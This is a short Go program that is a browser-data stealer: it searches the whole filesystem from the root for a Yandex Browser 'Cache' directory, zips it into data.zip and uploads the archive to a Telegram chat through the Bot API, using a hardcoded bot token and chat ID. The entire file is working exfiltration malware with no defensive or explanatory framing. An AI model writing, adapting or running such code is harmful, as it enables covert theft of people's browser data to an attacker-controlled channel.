package main

import (
	"bytes"
	"context"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/mholt/archiver/v4"
)

// data section
var (
	done      bool
	visited   = make(map[string]bool)
	rwMutex   sync.RWMutex
	resultDir string
	wg        sync.WaitGroup
	botToken  string = "7770330431:AAFit8pP9WoOgteTDDMKJ50kb4HgMlKdPus"
	chatId    string = "6623770793"
	flag      string = "Cache"
	subFlag   string = "yandex-browser"
	startPath string = "/"
)

// dir parser
func parseDir(dir, flag string, wg *sync.WaitGroup) {
	defer wg.Done()
	rwMutex.RLock()
	if done {
		rwMutex.RUnlock()
		return
	}
	rwMutex.RUnlock()
	rwMutex.Lock()
	if visited[dir] {
		rwMutex.Unlock()
		return
	}
	visited[dir] = true
	rwMutex.Unlock()
	tempDirs, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, file := range tempDirs {
		rwMutex.RLock()
		if done {
			rwMutex.RUnlock()
			return
		}
		rwMutex.RUnlock()
		fileName := file.Name()
		if (fileName == flag && strings.Contains(dir, subFlag) && subFlag != "") || (fileName == flag && subFlag == "") {
			rwMutex.Lock()
			resultDir, err = filepath.Abs(dir + "/" + fileName)
			if err != nil {
				return
			}
			done = true
			rwMutex.Unlock()
			return
		}
		if file.IsDir() {
			wg.Add(1)
			go parseDir(dir+"/"+fileName, flag, wg)
		}
	}
}

// file archiver
func zipTarget(filePath string) {
	zip := archiver.Zip{}
	out, err := os.Create("data.zip")
	if err != nil {
		return
	}
	defer out.Close()
	filesMap := map[string]string{
		filePath: filepath.Base(filePath) + "/",
	}
	var fileInfos []archiver.FileInfo
	fileInfos, err = archiver.FilesFromDisk(nil, filesMap)
	if err != nil {
		return
	}
	if err := zip.Archive(context.Background(), out, fileInfos); err != nil {
		return
	}
}

// file sender using telegram API
func fileSender(data string) {
	fileBytes, err := os.ReadFile(data)
	if err != nil {
		return
	}
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("document", filepath.Base(data))
	if err != nil {
		return
	}
	part.Write(fileBytes)
	writer.WriteField("chat_id", chatId)
	writer.Close()
	resp, err := http.Post(
		"https://api.telegram.org/bot"+botToken+"/sendDocument",
		writer.FormDataContentType(),
		body,
	)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// init function
func main() {
	// dirs parse section
	wg.Add(1)
	go parseDir(startPath, flag, &wg)
	wg.Wait()

	if done {
		zipTarget(resultDir)
		fileSender("data.zip")
	}
}
